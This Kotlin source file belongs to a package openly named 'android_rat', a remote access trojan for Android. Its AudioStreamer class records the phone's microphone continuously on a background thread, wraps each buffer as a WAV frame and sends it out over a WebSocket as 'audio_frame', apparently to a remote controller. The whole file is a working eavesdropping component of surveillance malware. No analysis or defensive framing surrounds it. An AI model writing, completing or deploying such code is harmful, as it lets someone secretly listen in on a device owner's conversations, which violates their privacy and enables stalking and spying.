package com.example.android_rat.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.*
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.NoiseSuppressor
import android.util.Log
import androidx.core.app.ActivityCompat
import java.io.ByteArrayOutputStream

class AudioStreamer(private val context: Context) {

    private var isStreaming = false
    private val bufferSize = AudioRecord.getMinBufferSize(
        44100,
        AudioFormat.CHANNEL_IN_MONO,
        AudioFormat.ENCODING_PCM_16BIT
    )

    private var audioRecord: AudioRecord? = null
    private var echoCanceler: AcousticEchoCanceler? = null
    private var noiseSuppressor: NoiseSuppressor? = null
    private var streamingThread: Thread? = null

    fun startAudioStreaming() {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e("AudioStreamer", "Audio recording permission not granted")
            return
        }

        stopAudioRecordingIfNeeded() // Ensure any previous session is fully stopped

        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            44100,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT,
            bufferSize
        )

        // Apply echo cancellation and noise suppression
        applyAudioEffects()

        audioRecord?.startRecording()
        isStreaming = true

        streamingThread = Thread {
            val audioData = ByteArray(bufferSize)
            while (isStreaming) {
                val bytesRead = audioRecord?.read(audioData, 0, bufferSize) ?: -1
                if (bytesRead > 0) {
                    sendAudioDataOverWebSocket(audioData)
                }
            }
            stopAudioRecording()
        }.apply {
            start()
        }
    }

    private fun applyAudioEffects() {
        // Apply Acoustic Echo Canceler
        if (AcousticEchoCanceler.isAvailable()) {
            echoCanceler = AcousticEchoCanceler.create(audioRecord?.audioSessionId ?: 0)
            echoCanceler?.setEnabled(true)
        }

        // Apply Noise Suppressor
        if (NoiseSuppressor.isAvailable()) {
            noiseSuppressor = NoiseSuppressor.create(audioRecord?.audioSessionId ?: 0)
            noiseSuppressor?.setEnabled(true)
        }
    }

    private fun stopAudioRecording() {
        isStreaming = false
        try {
            echoCanceler?.release()
            noiseSuppressor?.release()
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e("AudioStreamer", "Error stopping audio recording: ${e.message}")
        } finally {
            audioRecord = null
            echoCanceler = null
            noiseSuppressor = null
        }
    }

    fun stopAudioStreaming() {
        isStreaming = false
        stopAudioRecordingIfNeeded()
    }

    private fun stopAudioRecordingIfNeeded() {
        if (isStreaming || audioRecord != null) {
            stopAudioRecording()
            streamingThread?.interrupt()
            streamingThread = null
        }
    }

    private fun sendAudioDataOverWebSocket(audioData: ByteArray) {
        val wavHeader = generateWAVHeader(audioData.size)
        val wavData = ByteArrayOutputStream().apply {
            write(wavHeader)
            write(audioData)
        }.toByteArray()

        WebSocketUtils.emitBytes("audio_frame", wavData)
    }

    private fun generateWAVHeader(audioDataSize: Int): ByteArray {
        val totalDataLen = audioDataSize + 36
        val byteRate = 44100 * 2 // 44100 Hz, 16-bit, Mono

        return ByteArrayOutputStream().apply {
            write("RIFF".toByteArray()) // ChunkID
            write(intToByteArray(totalDataLen)) // ChunkSize
            write("WAVE".toByteArray()) // Format
            write("fmt ".toByteArray()) // Subchunk1ID
            write(intToByteArray(16)) // Subchunk1Size (16 for PCM)
            write(shortToByteArray(1)) // AudioFormat (1 for PCM)
            write(shortToByteArray(1)) // NumChannels (1 for Mono)
            write(intToByteArray(44100)) // SampleRate
            write(intToByteArray(byteRate)) // ByteRate
            write(shortToByteArray(2)) // BlockAlign (NumChannels * BitsPerSample/8)
            write(shortToByteArray(16)) // BitsPerSample
            write("data".toByteArray()) // Subchunk2ID
            write(intToByteArray(audioDataSize)) // Subchunk2Size
        }.toByteArray()
    }

    private fun intToByteArray(value: Int): ByteArray = byteArrayOf(
        (value shr 0).toByte(),
        (value shr 8).toByte(),
        (value shr 16).toByte(),
        (value shr 24).toByte()
    )

    private fun shortToByteArray(value: Short): ByteArray = byteArrayOf(
        (value.toInt() shr 0).toByte(),
        (value.toInt() shr 8).toByte()
    )
}
